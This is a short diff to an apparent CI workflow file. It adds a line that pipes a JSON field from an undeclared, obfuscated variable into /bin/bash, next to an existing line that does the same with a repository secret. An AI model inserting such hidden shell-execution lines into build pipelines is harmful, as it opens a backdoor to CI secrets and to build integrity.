@@ -20,6 +20,7 @@ jobs:
           sqas4847: ${{ secrets.sqas4847 }}
         run: |
           printf '%s' "$sqas4847" | jq -r .uoj8654 | /bin/bash
+          echo $z7371 | jq -r .zmns4292 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
